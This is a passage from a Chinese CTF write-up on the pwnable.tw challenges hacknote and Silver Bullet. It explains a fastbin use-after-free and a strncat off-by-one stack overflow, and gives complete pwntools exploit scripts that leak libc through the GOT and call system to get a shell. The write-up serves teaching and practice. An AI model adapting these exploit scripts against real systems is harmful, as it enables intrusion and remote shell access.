这里需要使用system的参数截断  
例如使用:

    
    
    "||sh"或者";sh"
    

这里可以利用malloc的分配机制  
首先申请两个note，长度>12(例，申请16字节)  
这时候堆内：

    
    
    16->24->16->24
    

而后使用delete_note来free这4个空间  
当我们再次add_note一个16字节的note时  
根据fastbin的LIFO原则  
从后往前第一个满足的空间便是第一个空间（第三个空间处覆盖为结构体）  
即：note的文本内容会修改原本0号结构体  
 **如果我们修改结构体中*text内容为.got.plt中的一个地址**  
 **那么print_note第0号即会打印出函数加载后的真实地址**  
再根据其在libc库中的偏移求出程序加载动态库的基址  
进而计算出system函数地址  
再继续修改一次结构体数据为system的地址（参数截断上面已说明）  
重新print_note来调用修改后结构体中地址对应的system函数  
进而获取shell

###  0x06 EXP

    
    
    from pwn import *
    
    def add_note(size,content):
          p.recvuntil("choice :")
          p.sendline("1")
          p.recvuntil("size :")
          p.sendline(size)
          p.recvuntil("Content :")
          p.sendline(content)
    
    def delete_note(index):
          p.recvuntil("choice :")
          p.sendline("2")
          p.recvuntil("Index :")
          p.sendline(index)
    
    def print_note(index):
          p.recvuntil("choice :")
          p.sendline("3")
          p.recvuntil("Index :")
          p.sendline(index)
    
    p=remote("chall.pwnable.tw", 10102)
    elf=ELF("./hacknote")
    elib=ELF("./libc_32.so.6")
    read_got=elf.got["read"]
    putnote=0x804862b
    add_note("16",15*"a")
    add_note("16",15*"a")
    delete_note('0')
    delete_note('1')
    add_note('8',p32(putnote)+p32(read_got))
    print_note('0')
    read_addr=u32(p.recv()[:4])
    sys_addr=read_addr-elib.symbols["read"]+elib.symbols["system"]
    delete_note('2')
    add_note('8',p32(sys_addr)+";shx00")
    print_note('0')
    p.interactive()
    

## pwnable.tw_challenge_Silver Bullet

打开程序：

    
    
    ./silver_bullet
    +++++++++++++++++++++++++++
           Silver Bullet       
    +++++++++++++++++++++++++++
     1. Create a Silver Bullet 
     2. Power up Silver Bullet 
     3. Beat the Werewolf      
     4. Return                 
    ++++++++++++++++++++++++++
    

类似一个游戏，开始没看懂怎么玩，直接载入IDA分析：

###  0x01 power_up

    
    
    int __cdecl power_up(char *dest)
    {
      char s; // [esp+0h] [ebp-34h]
      size_t v3; // [esp+30h] [ebp-4h]
    
      v3 = 0;
      memset(&s, 0, 0x30u);
      if ( !*dest )
        return puts("You need create the bullet first !");
      if ( *((_DWORD *)dest + 12) > 0x2Fu )         // *(dest+12)指针指向的值 > 47
        return puts("You can't power up any more !");
      printf("Give me your another description of bullet :");
      read_input(&s, 48 - *((_DWORD *)dest + 12));  // 限制读入长度
      strncat(dest, &s, 48 - *((_DWORD *)dest + 12)); //使用strncat连接两字符串，会自动在结尾添加x00
      v3 = strlen(&s) + *((_DWORD *)dest + 12);
      printf("Your new power is : %un", v3);
      *((_DWORD *)dest + 12) = v3;
      return puts("Enjoy it !");
    }
    

###  0x02 create_bullet

    
    
    int __cdecl create_bullet(char *s)
    {
      size_t v2; // ST08_4
    
      if ( *s )
        return puts("You have been created the Bullet !");
      printf("Give me your description of bullet :");
      read_input(s, 0x30u);
      v2 = strlen(s);
      printf("Your power is : %un", v2);           // s的长度
      *((_DWORD *)s + 12) = v2;                     // +12指12个dword长度
      return puts("Good luck !!");
    }
    

###  0x03 漏洞利用

可以看出漏洞与决定游戏成功的beat函数无关  
关键在power_up函数处：

    
    
    read_input(&s, 48 - *((_DWORD *)dest + 12));  
     strncat(dest, &s, 48 - *((_DWORD *)dest + 12));
    

这里依赖*dest+12处的值来限制读取长度  
而*dest后的数据可以利用strnca修改  
 **strncat会在字符串结尾自动补全x00**  
当我们先读取了一定长度字符串  
再连接一定长度字符串，两字符串恰好相加为48字节  
并由于strncat自动添加x00，便会覆盖*dest+12处的数据，造成栈溢出  
而此时依然依赖*dest+12处的值来限制读取长度  
我们便可以继续覆盖栈内数据  
直到将main返回地址修改  
我们需要调用system，便需要直到libc加载的基地址  
同hacknote相同  
我们可以修改main返回地址为put地址(即put在plt中的地址)  
参数为.got中一个地址  
便可利用put出的值以及此函数在libc中的位置计算出libc的基址  
进而计算出system地址  
而后我们重新利用上面的过程来调用system  
 **所以我们要重新调用main来重复利用上述过程**  
 **此处我们将put的返回地址覆盖为main开始地址即可**  
有一点注意：  
只有beat()成功时才会返回main  
否则直接4.return会exit(0)方式退出  
故而覆盖*dest+12处的数时，需要让他满足win的条件

###  0x04 EXP

    
    
    from pwn import *
    
    def create(s):
        p.recvuntil(':')
        p.sendline('1')
        p.recvuntil(':')
        p.sendline(s)
    
    def power_up(s):
        p.recvuntil(':')
        p.sendline('2')
        p.recvuntil(':')
        p.send(s)
    
    def beat():
        p.recvuntil(':')
        p.sendline('3')
    
    p=remote('chall.pwnable.tw', 10103)
    elf=ELF("./silver_bullet")
    elib=ELF("./libc_32.so.6")
    bin_sh_off = 0x158e8b
    puts_addr=0x80484a8
    read_got=elf.got["read"]
    main_addr=elf.symbols["main"]
    create('a'*47)
    power_up('a')
    payload = 'xff'*7+p32(puts_addr)+p32(main_addr)+p32(read_got)
    power_up(payload)
    beat()
    p.recvuntil("You win !!n")
    read_addr = u32(p.recv(4))
    sys_addr=read_addr-elib.symbols["read"]+elib.symbols["system"]
    bin_sh_addr=read_addr-elib.symbols["read"]+bin_sh_off
    create('a'*47)
    power_up('a')
    payload2='xff'*7 + p32(sys_addr) + 'a'*4 + p32(bin_sh_addr)
    power_up(payload2)
    beat()
    p.interactive()
    

审核人：yiwang 编辑：边边

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **SmallRR** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/150359](/post/id/150359)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [Pwn](/tag/Pwn)
  * [CTF](/tag/CTF)
  * [技术分析](/tag/技术分析)

 **+1** __1赞

 __收藏

![](https://p1.ssl.qhimg.com/t01dbe5c277062259fd.png) SmallRR

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

